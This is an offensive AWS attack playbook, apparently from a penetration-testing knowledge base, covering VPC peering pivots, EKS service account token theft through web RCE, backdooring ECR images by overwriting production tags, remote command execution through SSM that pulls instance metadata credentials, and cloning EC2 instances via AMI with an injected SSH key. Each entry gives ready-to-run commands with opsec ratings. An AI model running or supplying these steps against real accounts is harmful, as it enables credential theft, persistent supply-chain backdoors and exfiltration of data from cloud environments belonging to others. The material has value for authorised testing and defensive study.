# AWS VPC Lateral Movement & Container Attacks

## VPC Peering Pivot

### VPC Peering Chain Pivot (A → B → C) [added: 2026-04]
- **Tags:** #AWS #VPC #Peering #LateralMovement #NetworkPivot #SubnetEnum #RouteTable #CrossVPC
- **Trigger:** Compromised an EC2 instance and enumerated VPC peering connections to adjacent VPCs
- **Prereq:** Shell on EC2 in VPC B (peered to both A and C) or `ec2:DescribeVpcPeeringConnections` + `ec2:DescribeSubnets` permissions
- **Yields:** Network access to instances in peered VPCs, expanded attack surface across VPC boundaries
- **Opsec:** Low
- **Context:** VPC A has peering to B, B has peering to C. Compromise instance in B to reach C from A.
- **Payload/Method:**
  ```bash
  # Enumerate peering connections
  aws ec2 describe-vpc-peering-connections

  # Find accessible subnets for each VPC
  aws ec2 describe-subnets --filters "Name=vpc-id,Values=<vpc-id>"

  # Find routing tables — look for pcx (peering) entries
  aws ec2 describe-route-tables --filters "Name=vpc-id,Values=<vpc-id>"

  # List instances accessible through peered VPC
  aws ec2 describe-instances --filters "Name=vpc-id,Values=<target-vpc-id>"
  aws ec2 describe-instances --filters "Name=subnet-id,Values=<subnet-id>"
  ```

## Container (ECR/ECS/EKS) Attacks

### EKS Kubernetes Service Account Token Theft via RCE [added: 2026-04]
- **Tags:** #AWS #EKS #Kubernetes #ServiceAccount #TokenTheft #RCE #K8sAPI #PodEscape #ContainerBreakout
- **Trigger:** RCE on a pod running in EKS cluster
- **Prereq:** RCE or command injection on a pod + service account token mounted (default in most K8s configs)
- **Yields:** Kubernetes service account JWT token for K8s API access (may include cluster-admin or namespace-level permissions)
- **Opsec:** Low
- **Context:** RCE on pod — steal SA token to access K8s API
- **Payload/Method:**
  ```
  # Via web RCE
  https://victim.com/rce.php?cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token
  https://victim.com/rce.php?cmd=ls /var/run/secrets/kubernetes.io/serviceaccount/
  ```

### ECR Backdoor Image Injection (Supply Chain Persistence) [added: 2026-04]
- **Tags:** #AWS #ECR #Docker #SupplyChain #ImageBackdoor #ContainerPersistence #PutImage #RegistryAbuse
- **Trigger:** Have ECR push permissions and want to establish persistent backdoor in container deployment pipeline
- **Prereq:** `ecr:PutImage` + `ecr:GetAuthorizationToken` + Docker installed + knowledge of target repository and tag
- **Yields:** Persistent backdoor executing on every container deployment/restart with the container's IAM task role
- **Opsec:** Med
- **Context:** Have `ecr:PutImage` + `ecr:GetAuthorizationToken` — replace legit image with backdoored one
- **Payload/Method:**
  ```bash
  # Authenticate Docker to ECR
  aws ecr get-login-password --region us-east-1 | \
    docker login --username AWS --password-stdin <account>.dkr.ecr.us-east-1.amazonaws.com

  # Pull existing image, add backdoor, rebuild
  docker pull <ecr-repo>:<tag>
  # Modify Dockerfile to add reverse shell / beacon
  docker build -t backdoor_image .
  docker tag backdoor_image <ecr-repo>:<same-tag>

  # Push — overwrites production image
  docker push <ecr-repo>:<same-tag>
  # Next deployment/restart will execute backdoor with container's IAM role
  ```

### ECS/Fargate Enumeration for Pivoting [added: 2026-04]
- **Tags:** #AWS #ECS #Fargate #Enumeration #ContainerRecon #NetworkTopology #TaskMetadata #Pivoting
- **Trigger:** Have ECS permissions and want to map container network topology for lateral movement
- **Prereq:** `ecs:ListClusters` + `ecs:DescribeClusters` + `ecs:ListTasks` + `ecs:DescribeTasks` permissions
- **Yields:** Container private IPs, security group mappings, network configurations, and credential endpoint paths
- **Opsec:** Low
- **Context:** Enumerate ECS to find network topology and credential endpoints
- **Payload/Method:**
  ```bash
  aws ecs list-clusters
  aws ecs describe-clusters --cluster <name>
  aws ecs list-tasks --cluster <name>
  aws ecs describe-tasks --cluster <name> --tasks <taskArn>
  # Task description includes: private IP, security groups, network config
  ```

### SSM Command Execution (Agentless Shell on EC2) [added: 2026-04]
- **Tags:** #AWS #SSM #SendCommand #RemoteExec #AgentlessShell #SystemsManager #EC2Access #LateralMovement
- **Trigger:** Have `ssm:SendCommand` permission and target EC2 instances have SSM agent installed
- **Prereq:** `ssm:SendCommand` + `ssm:ListCommandInvocations` permissions + target EC2 with SSM agent running
- **Yields:** Remote command execution on EC2 instances without SSH keys, security group changes, or direct network access
- **Opsec:** Med
- **Context:** Have `ssm:SendCommand` — execute commands on any EC2 with SSM agent (no SSH needed)
- **Payload/Method:**
  ```bash
  # Find instances with SSM agent
  aws ssm describe-instance-information --region eu-west-1

  # Execute command
  aws ssm send-command \
    --instance-ids "i-05bXXXXXXXXXadaa" \
    --document-name "AWS-RunShellScript" \
    --parameters '{"commands":["id","curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]}' \
    --region eu-west-1

  # Get output
  aws ssm list-command-invocations --command-id "<COMMAND-ID>" --details
  ```
- **Note:** SSM agent preinstalled on: Amazon Linux, Amazon Linux 2, Ubuntu 16.04/18.04, Windows Server 2008+ (post Nov 2016), ECS-Optimized AMIs.

### EC2 Copy via AMI (Snapshot Entire Instance) [added: 2026-04]
- **Tags:** #AWS #EC2 #AMI #CreateImage #InstanceClone #DataExfil #SSHKeyInjection #SnapshotAttack
- **Trigger:** Want full filesystem access to a target EC2 instance and have CreateImage permission
- **Prereq:** `ec2:CreateImage` + `ec2:RunInstances` + `ec2:ImportKeyPair` permissions + target instance ID
- **Yields:** Complete clone of target instance with your SSH key, providing full filesystem and data access
- **Opsec:** Med
- **Context:** Have `ec2:CreateImage` — snapshot a running instance and launch copy with your key
- **Payload/Method:**
  ```bash
  # Create AMI from running instance (no downtime required)
  aws ec2 create-image --instance-id <i-xxx> \
    --name "Audit Copy" --description "pentest" --no-reboot

  # Add your SSH key
  aws ec2 import-key-pair --key-name "AuditKey" \
    --public-key-material file://~/.ssh/id_rsa.pub

  # Launch copy with your key and same security group
  aws ec2 run-instances --image-id <ami-from-above> \
    --security-group-ids <sg-xxx> --subnet-id <subnet-xxx> \
    --key-name AuditKey --instance-type t2.micro

  # Cleanup after PoC
  aws ec2 stop-instances --instance-id <new-instance>
  aws ec2 terminate-instances --instance-id <new-instance>
  ```
